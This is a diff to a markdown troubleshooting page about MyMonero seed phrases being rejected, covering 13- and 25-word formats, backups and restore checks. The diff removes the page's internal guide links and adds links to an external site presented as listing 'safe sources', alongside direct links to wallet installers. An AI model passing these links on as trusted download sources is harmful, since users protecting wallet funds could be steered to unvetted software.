@@ -20,6 +20,9 @@ All versions and checksums are on the [MyMonero v1.3.3 release page](https://git
 ## Short answer
 A MyMonero seed may be rejected if the restore option expects a different format, the phrase was copied incorrectly, or the backup is incomplete. MyMonero uses either a 13-word legacy phrase or a 25-word standard Monero phrase; keep yours private while checking.
 
+
+Prefer reading on the web? The [MyMonero seed not accepted page](https://mymonero.info/mymonero-seed-not-accepted) on mymonero.info explains the same problem, the [MyMonero download page](https://mymonero.info/github/monero-projects) lists the safe sources, and [the MyMonero FAQ](https://mymonero.info/faq) covers the common questions.
+
 ## You'll see this if
 - A wallet says your recovery phrase is invalid or has the wrong number of words.
 - The restore screen accepts a 25-word phrase but you have 13 words.
@@ -56,7 +59,7 @@ If the phrase is accepted but the wallet appears empty, investigate restore heig
 ## Prevention
 Keep a clear offline backup with the word order intact. Label whether it is a 13-word MyMonero-specific legacy phrase or a 25-word standard Monero phrase, without writing the phrase on the outside of an exposed container. Protect copies from unauthorized access, loss, and damage. Verify the backup privately before you need to restore; do not enter it into a web checker.
 
-Keep a separate record of wallet identity and restore context. Make sure family or trusted arrangements do not disclose the seed inadvertently. Review [safe seed backup practices](./mymonero-backup-seed-safely.md) and [finding your MyMonero seed](./find-mymonero-seed.md). For download integrity, use SHA-256 rather than a seed phrase; read [the checksum guide](./verify-mymonero-download-sha256.md).
+Keep a separate record of wallet identity and restore context. Make sure family or trusted arrangements do not disclose the seed inadvertently. Review safe seed backup practices and finding your MyMonero seed. For download integrity, use SHA-256 rather than a seed phrase; read the checksum guide.
 
 ## FAQ
 <details><summary>Does 13 words mean my seed is broken?</summary>
@@ -87,6 +90,7 @@ Not necessarily. Check that scanning has completed and that the restore height i
 
 ## Download MyMonero
 
+- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/monero-projects)
 - Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
 - macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
 - Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)
